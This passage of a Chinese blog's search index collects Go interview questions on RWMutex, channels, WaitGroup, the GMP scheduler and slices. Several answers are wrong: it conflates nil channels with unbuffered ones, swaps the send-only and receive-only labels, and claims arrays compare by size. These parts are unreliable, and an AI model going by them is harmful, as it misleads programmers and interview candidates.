，同时有多个读或者多个写操作时，只要有一个线程在执行写操作，其他的线程都不能进行读操作。</p><p>读写锁其实有三种工作模型：</p><ul><li>Read-perferring优先读设计，可能会导致写饥饿</li><li>Write-prferring优先写设计，避免写饥饿</li><li>不指定优先级不区分优先级，解决饥饿问题</li></ul><p>Go 中的读写锁，工作模型是 Write-prferring 方案。</p><ol><li><p>读写锁解决问题</p><p>主要应用于写操作少，读操作多的场景。读写锁满足以下四条规则。</p><ul><li>写锁需要阻塞写锁：一个协程拥有写锁时，其他协程写锁定需要阻塞；</li><li>写锁需要阻塞读锁：一个协程拥有写锁时，其他协程读锁定需要阻塞；</li><li>读锁需要阻塞写锁：一个协程拥有读锁时，其他协程写锁定需要阻塞；</li><li>读锁不能阻塞读锁：一个协程拥有读锁时，其他协程也可以拥有读锁。</li></ul></li><li><p>读写锁底层实现</p><p>读写锁内部仍有一个互斥锁，用于将多个写操作隔离开来，其他几个都用于隔离读操作和写操作。</p><p>源码包<code>src/sync/rmmutex.go:RWMutex</code>中定义了读写锁的数据结构 </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> RWMutex <span class="keyword">struct</span> &#123;</span><br><span class="line">    w Mutex <span class="comment">// held if there are pending writers</span></span><br><span class="line">    writerSem <span class="type">uint32</span> <span class="comment">// semaphore for writers to wait for completing readers</span></span><br><span class="line">    readerSem <span class="type">uint32</span> <span class="comment">// semaphore for readers to wait for completing writers</span></span><br><span class="line">    readerCount <span class="type">int32</span> <span class="comment">// number of pending readers</span></span><br><span class="line">    readerWait <span class="type">int32</span> <span class="comment">// number of departing readers</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="数组是如何实现用下标访问任意元素的"><a href="#数组是如何实现用下标访问任意元素的" class="headerlink" title="数组是如何实现用下标访问任意元素的"></a>数组是如何实现用下标访问任意元素的</h2><p>数组是分配了一段<code>连续内存</code>的类型，数组索引函数通过数组类型记录的<code>第一个元素地址</code>即数组起始地址开始进行运算，下标从<code>0</code>开始，每<code>+1</code>即从起始地址 <code>+1</code>进行取值。</p><h2 id="2个协程交替打印字母和数字"><a href="#2个协程交替打印字母和数字" class="headerlink" title="2个协程交替打印字母和数字"></a>2个协程交替打印字母和数字</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">limit := <span class="number">26</span></span><br><span class="line"></span><br><span class="line">numChan := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">1</span>)</span><br><span class="line">charChan := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">1</span>)</span><br><span class="line">mainChan := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">1</span>)</span><br><span class="line">charChan &lt;- <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; limit; i++ &#123;</span><br><span class="line">&lt;-charChan</span><br><span class="line">fmt.Printf(<span class="string">&quot;%c\n&quot;</span>, <span class="string">&#x27;a&#x27;</span>+i)</span><br><span class="line">numChan &lt;- <span class="number">1</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; limit; i++ &#123;</span><br><span class="line">&lt;-numChan</span><br><span class="line">fmt.Println(i)</span><br><span class="line">charChan &lt;- <span class="number">1</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">mainChan &lt;- <span class="number">1</span></span><br><span class="line">&#125;()</span><br><span class="line">&lt;-mainChan</span><br><span class="line"><span class="built_in">close</span>(charChan)</span><br><span class="line"><span class="built_in">close</span>(numChan)</span><br><span class="line"><span class="built_in">close</span>(mainChan)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="🪫（待补充，python协程线程进程机制更复杂）goroutine与线程的区别？"><a href="#🪫（待补充，python协程线程进程机制更复杂）goroutine与线程的区别？" class="headerlink" title="🪫（待补充，python协程线程进程机制更复杂）goroutine与线程的区别？"></a>🪫（待补充，python协程线程进程机制更复杂）goroutine与线程的区别？</h2><ul><li>一个线程可以有多个协程</li><li>线程、进程都是同步机制，而协程是异步</li><li>协程可以保留上一次调用时的状态，当过程重入时，相当于进入了上一次的调用状态</li><li>协程是需要线程来承载运行的，所以协程并不能取代线程，线程是被分割的CPU资源，协程是组织好的代码流程</li></ul>]]></content>
      
      
      <categories>
          
          <category> 面试题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang题库（四）</title>
      <link href="/posts/5389.html"/>
      <url>/posts/5389.html</url>
      
        <content type="html"><![CDATA[<h1 id="Golang题库（四）"><a href="#Golang题库（四）" class="headerlink" title="Golang题库（四）"></a>Golang题库（四）</h1><h2 id="map取一个key，然后修改这个值，原map数据的值会不会变化？"><a href="#map取一个key，然后修改这个值，原map数据的值会不会变化？" class="headerlink" title="map取一个key，然后修改这个值，原map数据的值会不会变化？"></a>map取一个key，然后修改这个值，原map数据的值会不会变化？</h2><p>map属于引用类型，所以取一个key，然后修改这个值，原map数据的值会发生变化</p><h2 id="向为nil的channel发送数据会怎么样"><a href="#向为nil的channel发送数据会怎么样" class="headerlink" title="向为nil的channel发送数据会怎么样"></a>向为nil的channel发送数据会怎么样</h2><p><strong>空通道即无缓冲通道</strong>。无缓冲通道上的发送操作将会阻塞，直到另一个goroutine在对应的通道上执行接收操作，这时值传送完成，两个goroutine都可以继续执行。相反，如果接收操作先执行，接收方gorountine将阻塞，直到另一个goroutine在同一个通道上发送一个值。</p><p>使用无缓冲通道进行的通信导致发送和接收goroutine同步化。因此，无缓冲通道也称为<em>同步通道</em>。当一个值在无缓冲通道上传递时，接收值后发送方goroutine才被再次唤醒。</p><h2 id="WaitGroup的坑"><a href="#WaitGroup的坑" class="headerlink" title="WaitGroup的坑"></a>WaitGroup的坑</h2><ol><li><p>Add一个负数<br>如果计数器的值小于0会直接panic</p></li><li><p>Add在Wait之后调用<br>比如一些子协程开头调用Add结束调用Wait，这些 Wait无法阻塞子协程。正确做法是在开启子协程之前先Add特定的值。</p></li><li><p>未置为0就重用<br>WaitGroup可以完成一次编排任务，计数值降为0后可以继续被其他任务所用，但是不要在还没使用完的时候就用于其他任务，这样由于带着计数值，很可能出问题。</p></li><li><p>复制waitgroup<br>WaitGroup有nocopy字段，不能被复制。也意味着WaitGroup不能作为函数的参数。</p></li></ol><h2 id="go-struct-能不能比较"><a href="#go-struct-能不能比较" class="headerlink" title="go struct 能不能比较"></a>go struct 能不能比较</h2><p>需要具体情况具体分析，如果struct中含有不能被比较的字段类型，就不能被比较，如果struct中所有的字段类型都支持比较，那么就可以被比较。</p><p>不可被比较的类型:<br>① slice，因为slice是引用类型，除非是和nil比较<br>② map，和slice同理，如果要比较两个map只能通过循环遍历实现<br>③ 函数类型</p><p>其他的类型都可以比较。</p><p>还有两点值得注意：</p><ul><li>结构体之间只能比较它们是否相等，而不能比较它们的大小。</li><li>只有所有属性都相等而属性顺序都一致的结构体才能进行比较。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 面试题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang题库（三）</title>
      <link href="/posts/31692.html"/>
      <url>/posts/31692.html</url>
      
        <content type="html"><![CDATA[<h1 id="Golang题库（三）"><a href="#Golang题库（三）" class="headerlink" title="Golang题库（三）"></a>Golang题库（三）</h1><h2 id="同一个协程里面，对无缓冲channel同时发送和接收数据有什么问题"><a href="#同一个协程里面，对无缓冲channel同时发送和接收数据有什么问题" class="headerlink" title="同一个协程里面，对无缓冲channel同时发送和接收数据有什么问题"></a>同一个协程里面，对无缓冲channel同时发送和接收数据有什么问题</h2><p> 同一个协程里，不能对无缓冲channel同时发送和接收数据，如果这么做会直接报错死锁。</p><p>对于一个无缓冲的channel而言，只有不同的协程之间一方发送数据一方接受数据才不会阻塞。channel无缓冲时，发送阻塞直到数据被接收，接收阻塞直到读到数据。</p><h2 id="channel和锁的对比"><a href="#channel和锁的对比" class="headerlink" title="channel和锁的对比"></a>channel和锁的对比</h2><div class="tabs"><div class="nav-tabs"><button type="button" class="tab active">作用</button><button type="button" class="tab">区别</button></div><div class="tab-contents"><div class="tab-item-content active"><ul><li><code>Channel</code>是用于处理协程中的数据通信问题的，通过编程逻辑设计，可以实现<code>锁</code>的效果。</li><li><code>Mutex</code>是用于控制原子性操作数据安全性，通过<code>加锁</code>和<code>释放</code>确保区间内数据只能有单一协程访问。数据一致性。</li></ul></div><div class="tab-item-content"><ul><li>两者的用途不同</li><li>两者内存占用也不同</li></ul></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div><h2 id="channel的应用场景"><a href="#channel的应用场景" class="headerlink" title="channel的应用场景"></a>channel的应用场景</h2><div class="note info simple"><p><code>channel</code>用于协程之间数据通信，根据设计能够实现多种功能。</p></div><h3 id="任务超时与取消"><a href="#任务超时与取消" class="headerlink" title="任务超时与取消"></a>任务超时与取消</h3><p>通过在通道中传递信号，可以实现任务的超时和取消机制。例如，一个 goroutine 可以在执行耗时操作时启动一个定时器，如果操作在指定时间内未完成，可以通过通道发送取消信号给其他 goroutine，从而取消操作。</p><p>比如超时处理：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> &lt;-time.After(time.Second):</span><br></pre></td></tr></table></figure><p>定时任务</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> &lt;- time.Tick(time.Second)</span><br></pre></td></tr></table></figure><h3 id="事件发布与订阅（事件驱动编程）"><a href="#事件发布与订阅（事件驱动编程）" class="headerlink" title="事件发布与订阅（事件驱动编程）"></a>事件发布与订阅（事件驱动编程）</h3><p>通道可以用作发布者和订阅者之间的消息传递机制。发布者将事件发送到通道，订阅者从通道接收事件并进行相应的处理。这种模式可以用于实现观察者模式或消息队列等场景。</p><h3 id="控制并发数"><a href="#控制并发数" class="headerlink" title="控制并发数"></a>控制并发数</h3><p>通道可以用于限制并发任务的数量，控制并发度。通过<strong>创建有缓冲的通道</strong>，可以限制通道中可以放入的元素数量，从而控制并发任务的数量。例如控制并发为5个协程：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">5</span>)</span><br><span class="line"><span class="keyword">for</span> _, url := <span class="keyword">range</span> urls &#123;</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        ch &lt;- <span class="number">1</span></span><br><span class="line">        worker(url)</span><br><span class="line">        &lt;- ch</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数据流处理"><a href="#数据流处理" class="headerlink" title="数据流处理"></a>数据流处理</h3><p>通道在处理数据流时非常有用。一个 goroutine 可以负责生成数据，并将数据发送到通道中，而另一个或多个 goroutine 可以从通道中接收数据并进行处理，实现数据的流动和处理。</p><h3 id="并发任务的协调"><a href="#并发任务的协调" class="headerlink" title="并发任务的协调"></a>并发任务的协调</h3><p>通道可以用于在不同的 goroutine 之间传递数据，实现并发任务的协调和通信。例如，一个主 goroutine 可以将任务分发给多个工作 goroutine，通过通道发送任务并接收结果。</p><h3 id="多个-goroutine-的结果汇总"><a href="#多个-goroutine-的结果汇总" class="headerlink" title="多个 goroutine 的结果汇总"></a>多个 goroutine 的结果汇总</h3><p>当有多个 goroutine 并行执行任务时，可以使用通道将它们的结果汇总。每个 goroutine 将结果发送到通道，然后另一个 goroutine 从通道中接收并处理这些结果。</p><h3 id="线程安全的数据传递与共享"><a href="#线程安全的数据传递与共享" class="headerlink" title="线程安全的数据传递与共享"></a>线程安全的数据传递与共享</h3><p>通道提供了一种线程安全的数据传递方式，避免了显式的锁操作。多个 goroutine 可以通过通道进行数据传递和共享，保证数据访问的原子性和一致性。</p><h2 id="slice和array区别"><a href="#slice和array区别" class="headerlink" title="slice和array区别"></a>slice和array区别</h2><p>在Go语言中，Slice（切片）和Array（数组）是两种不同的数据类型，它们之间有以下区别：</p><ol><li>大小固定 vs. 大小可变：数组的长度是固定的，在声明时就需要指定其长度，并且长度不可变。而切片的长度是可变的，可以根据需要进行动态扩容或缩减。</li><li>值传递 vs. 引用传递：数组在赋值或传递给函数时是按值传递的，即会复制整个数组的内容。切片则是引用传递的，赋值或传递切片时只会复制切片的指针、长度和容量，并不会复制底层数据。</li><li>内存分配方式：数组在声明时会直接在内存中分配连续的空间来存储元素，因此数组的内存布局是连续的。切片则是建立在数组之上的动态数据结构，底层依赖于数组，并且可以自动进行内存扩容。</li><li>初始化方式：数组可以使用字面量或初始化表达式进行初始化，需要指定固定长度。切片可以通过使用字面量或通过 make() 函数进行初始化，并且可以根据需要动态改变长度。</li><li>传递性：数组作为函数参数传递时，会进行一次完整的复制，传递的是数组的副本。而切片作为函数参数传递时，只是传递了指向底层数组的指针、长度和容量，不会进行复制。</li><li>长度信息：数组的长度是固定的，可以通过 len() 函数获取数组的长度。切片则可以使用 len() 函数获取当前切片的长度，可以通过 cap() 函数获取切片的容量。</li></ol><p>总的来说，数组适用于固定长度且不需要频繁扩容的情况，而切片则更加灵活，适用于需要动态改变长度或进行大量操作的场景。在实际开发中，切片更常用，因为它提供了更多的便利和功能，而数组则更适合特定需求的场景。</p>]]></content>
      
      
      <categories>
          
          <category> 面试题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang题库（二）</title>
      <link href="/posts/30645.html"/>
      <url>/posts/30645.html</url>
      
        <content type="html"><![CDATA[<h1 id="Golang题库（二）"><a href="#Golang题库（二）" class="headerlink" title="Golang题库（二）"></a>Golang题库（二）</h1><h2 id="数组怎么转集合"><a href="#数组怎么转集合" class="headerlink" title="数组怎么转集合?"></a>数组怎么转集合?</h2><p>无法直接转换，需要通过遍历数组，构造一个map。例如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">arr := [<span class="number">5</span>]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">int</span>]<span class="type">int</span>, <span class="number">5</span>)</span><br><span class="line"><span class="keyword">for</span> i, v := <span class="keyword">range</span> arr &#123;</span><br><span class="line">m[i] = v</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(m)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="⭐Go的GMP模型"><a href="#⭐Go的GMP模型" class="headerlink" title="⭐Go的GMP模型?"></a>⭐Go的GMP模型?</h2><p>G是<code>Goroutine</code>的缩写，相当于操作系统的进程控制块(process control block)。它包含：函数执行的指令和参数，任务对象，线程上下文切换，字段保护，和字段的寄存器。</p><p>M是一个线程，每个M都有一个线程的栈。如果没有给线程的栈分配内存，操作系统会给线程的栈分配默认的内存。当线程的栈制定，M.stack-&gt;G.stack, M的PC寄存器会执行G提供的函数。</p><p>P(处理器，Processor)是一个抽象的概念，不是物理上的CPU。当一个P有任务，需要创建或者唤醒一个系统线程去处理它队列中的任务。P决定同时执行的任务的数量，<code>GOMAXPROCS</code>限制系统线程执行用户层面的任务的数量。</p><p>GO调度器的调度过程，首先创建一个G对象，然后G被保存在P的本地队列或者全局队列（global queue）。这时P会唤醒一个M。P按照它的执行顺序继续执行任务。M寻找一个空闲的P，如果找得到，将G与自己绑定。然后M执行一个调度循环：调用G对象-&gt;执行-&gt;清理线程-&gt;继续寻找Goroutine。</p><p>在M的执行过程中，上下文切换随时发生。当切换发生，任务的执行现场需要被保护，这样在下一次调度执行可以进行现场恢复。M的栈保存在G对象中，只有现场恢复需要的寄存器(SP,PC等)，需要被保存到G对象。</p><p>如果G对象还没有被执行，M可以将G重新放到P的调度队列，等待下一次的调度执行。当调度执行时，M可以通过G的vdsoSP, vdsoPC 寄存器进行现场恢复。</p><p>P队列 P有2种类型的队列：</p><ol><li>本地队列：本地的队列是无锁的，没有数据竞争问题，处理速度比较高。</li><li>全局队列：是用来平衡不同的P的任务数量，所有的M共享P的全局队列。</li></ol><p>线程清理 G的调度是为了实现P/M的绑定，所以线程清理就是释放P上的G，让其他的G能够被调度。</p><ol><li>主动释放(active release)：典型的例子是，执行G任务时，发生了系统调用(system call)，这时M会处于阻塞（Block）状态。调度器会设置一个超时时间，来释放P。</li><li>被动释放(passive release)：如果系统调用发生，监控程序需要扫描处于阻塞状态的P/M。 这时，超时之后，P资源会回收，程序被安排给队列中的其他G任务。</li></ol><h2 id="Go和java比有什么不同"><a href="#Go和java比有什么不同" class="headerlink" title="Go和java比有什么不同?"></a>Go和java比有什么不同?</h2><p>Go也称为Golang，是一种开源编程语言，Go可以轻松构建可靠，简单和高效的软件。Go是键入的静态编译语言。Go语言提供垃圾收机制，CSP风格的并发性，内存安全性和结构类型。</p><p>Java是一种用于一般用途的计算机编程语言，它是基于类的，并发的和面向对象的。Java专门设计为包含很少的实现依赖项。Java应用程序在JVM（Java虚拟机）上运行。它是当今最著名的编程语言之一。Java是一种用于为多个平台开发软件的编程语言。Java应用程序上的编译代码或字节码可以在大多数操作系统上运行，包括Linux，Mac操作系统和Linux。Java的大部分语法都源自C ++和C语言。</p><p>go语言和java之间的区别</p><ul><li><p>函数重载</p><p>Go上不允许函数重载，必须具有方法和函数的唯一名称；</p><p>java允许函数重载。</p></li><li><p>速度</p><p>go的速度比java快</p></li><li><p>多态</p><p>Java默认允许多态。而Go没有。</p></li><li><p>路由配置</p><p>Go语言使用HTTP协议进行路由配置；</p><p>java使用Akka.routing.ConsistentHashingRouter和Akka.routing.ScatterGatherFirstCompletedRouter进行路由配置。</p></li><li><p>可扩展性</p><p>Go代码可以自动扩展到多个核心；而Java并不总是具有足够的可扩展性。</p></li><li><p>继承</p><p>Go语言的继承通过匿名组合完成：基类以Struct的方式定义，子类只需要把基类作为成员放在子类的定义中，支持多继承；</p><p>Java的继承通过extends关键字完成，不支持多继承。</p></li></ul><h2 id="介绍一下channel"><a href="#介绍一下channel" class="headerlink" title="介绍一下channel"></a>介绍一下channel</h2><p><code>Channel</code>是<code>Go</code>里面的一种并发原语，每一个管道对象都有一种具体的类型，例如<code>chan int</code>一种传输<code>int</code>类型的管道。</p><p><code>chan</code>是一种在函数传输中是一种引用类型，同其他引用类型一样，零值为<code>nil</code>。</p><p>通道有两个主要操作：发送(send)和接收(receive)，两者统称为通信。send语句从一个goroutine传输一个值到另一个在执行接收表达式的goroutine。两个操作都使用<code>&lt;-</code>操作符书写。发送语句中，通道和值分别在<code>&lt;-</code>的左右两边。在接收表达式中，<code>&lt;-</code>放在通道操作数前面，在接收表达式中，其结果未被使用也是合法的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ch &lt;- x<span class="comment">//发送语句</span></span><br><span class="line">x = &lt;-ch<span class="comment">//接收语句</span></span><br><span class="line">&lt;-ch<span class="comment">//接收语句，丢弃结果</span></span><br></pre></td></tr></table></figure><p>通道支持第三个操作：关闭 (close)，它设置一个标志位来指示值当前已经发送完毕，这个通道后面没有值了；关闭后的发送操作将导致宕机。在一个已经关闭的通道上进行接收操作，将获取所有已经发送的值，直到通道为空；这时任何接收操作会立即完成，同时获取到一个通道元素对应的零值。通过调用内置的<code>close</code>函数来关闭通道：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">close</span>(ch)</span><br></pre></td></tr></table></figure><p>根据通道的容量，可以将通道分为无缓冲通道和缓冲通道</p><ul><li><p>无缓冲通道</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ch = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line">ch = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure></li><li><p>有缓冲通道</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ch = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">3</span>)</span><br></pre></td></tr></table></figure></li></ul><p>根据通道传输方向，还可以通道分为双向通道，只读通道和只写通道</p><ul><li><p>只读通道</p><p>只能发送的通道，允许发送但不允许接收</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">chan</span>&lt;- <span class="type">int</span></span><br></pre></td></tr></table></figure></li><li><p>只写通道</p><p>只能接收的通道，允许接收但不允许发送</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;-<span class="keyword">chan</span> <span class="type">int</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="channel实现方式-原理-概念-底层实现"><a href="#channel实现方式-原理-概念-底层实现" class="headerlink" title="channel实现方式/原理/概念/底层实现"></a>channel实现方式/原理/概念/底层实现</h2><p><strong>背景：</strong></p><ul><li>Go语言提供了一种不同的并发模型–通信顺序进程(communicating sequential processes,CSP)。</li><li>设计模式：通过通信的方式共享内存</li><li>channel收发操作遵循先进先出(FIFO)的设计</li></ul><p><strong>底层结构:</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> hchan <span class="keyword">struct</span> &#123;</span><br><span class="line">    qcount   <span class="type">uint</span>           <span class="comment">// channel中的元素个数</span></span><br><span class="line">    dataqsiz <span class="type">uint</span>           <span class="comment">// channel中循环队列的长度</span></span><br><span class="line">    buf      unsafe.Pointer <span class="comment">// channel缓冲区数据指针</span></span><br><span class="line">    elemsize <span class="type">uint16</span>            <span class="comment">// buffer中每个元素的大小</span></span><br><span class="line">    closed   <span class="type">uint32</span>            <span class="comment">// channel是否已经关闭，0未关闭</span></span><br><span class="line">    elemtype *_type <span class="comment">// channel中的元素的类型</span></span><br><span class="line">    sendx    <span class="type">uint</span>   <span class="comment">// channel发送操作处理到的位置</span></span><br><span class="line">    recvx    <span class="type">uint</span>   <span class="comment">// channel接收操作处理到的位置</span></span><br><span class="line">    recvq    waitq  <span class="comment">// 等待接收的sudog（sudog为封装了goroutine和数据的结构）队列由于缓冲区空间不足而阻塞的Goroutine列表</span></span><br><span class="line">    sendq    waitq  <span class="comment">// 等待发送的sudogo队列，由于缓冲区空间不足而阻塞的Goroutine列表</span></span><br><span class="line"></span><br><span class="line">    lock mutex   <span class="comment">// 一个轻量级锁</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>channel创建:</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">3</span>)</span><br></pre></td></tr></table></figure><ul><li>创建channel实际上就是在内存中实例化了一个<em><strong>hchan</strong></em>结构体，并返回一个chan指针</li><li>channle在函数间传递都是使用的这个指针，这就是为什么函数传递中无需使用channel的指针，而是直接用channel就行了，因为channel本身就是一个指针</li></ul><p><strong>channel发送数据：</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ch &lt;- <span class="number">1</span></span><br><span class="line">ch &lt;- <span class="number">2</span></span><br></pre></td></tr></table></figure><ul><li>检查 recvq 是否为空，如果不为空，则从 recvq 头部取一个 goroutine，将数据发送过去，并唤醒对应的 goroutine 即可。</li><li>如果 recvq 为空，则将数据放入到 buffer 中。</li><li>如果 buffer 已满，则将要发送的数据和当前 goroutine 打包成 sudog 对象放入到 sendq中。并将当前 goroutine 置为 waiting 状态。</li></ul><p><strong>channel接收数据：</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;-ch</span><br><span class="line">&lt;-ch</span><br></pre></td></tr></table></figure><ul><li>检查sendq是否为空，如果不为空，且没有缓冲区，则从sendq头部取一个goroutine，将数据读取出来，并唤醒对应的goroutine，结束读取过程。</li><li>如果sendq不为空，且有缓冲区，则说明缓冲区已满，则从缓冲区中首部读出数据，把sendq头部的goroutine数据写入缓冲区尾部，并将goroutine唤醒，结束读取过程。</li><li>如果sendq为空，缓冲区有数据，则直接从缓冲区读取数据，结束读取过程。</li><li>如果sendq为空，且缓冲区没数据，则只能将当前的goroutine加入到recvq,并进入waiting状态，等待被写goroutine唤醒。</li></ul><p><strong>channel规则：</strong></p><table><thead><tr><th>操作</th><th>空channel</th><th>已关闭channel</th><th>活跃中的channel</th></tr></thead><tbody><tr><td>close(ch)</td><td>panic</td><td>panic</td><td>成功关闭</td></tr><tr><td>ch&lt;- v</td><td>永远阻塞</td><td>panic</td><td>成功发送或阻塞</td></tr><tr><td>v,ok = &lt;-ch</td><td>永远阻塞</td><td>不阻塞</td><td>成功接收或阻塞</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 面试题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang题库（一）</title>
      <link href="/posts/59343.html"/>
      <url>/posts/59343.html</url>
      
        <content type="html"><![CDATA[<h1 id="Golang题库（一）"><a href="#Golang题库（一）" class="headerlink" title="Golang题库（一）"></a>Golang题库（一）</h1><h2 id="golang里的数组和切片有了解过吗？"><a href="#golang里的数组和切片有了解过吗？" class="headerlink" title="golang里的数组和切片有了解过吗？"></a>golang里的数组和切片有了解过吗？</h2><h3 id="值传递和引用传递"><a href="#值传递和引用传递" class="headerlink" title="值传递和引用传递"></a>值传递和引用传递</h3><p>在函数传参中，数组是值传递，切片则是引用传递。即函数内修改数组，外不变，而切片则<font><strong>相反</strong></font>。</p><h3 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h3><p>数组能比较大小，切片则只能与<code>nil</code>比较。</p><h3 id="容量和长度"><a href="#容量和长度" class="headerlink" title="容量和长度"></a>容量和长度</h3><p><strong>数组</strong>是连续地址的储存相同类型元素的序列，初始化容量之后，不可变。</p><p><strong>切片</strong>是指向数组的拥有相同类型元素的可变长序列，可以扩容和传递，比数组更加灵活。</p><p>Go切片(slice)的实现可以在源码包<code>src/runtime/slice.go</code>中找到。在源码中，slice的数据结构定义如下。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 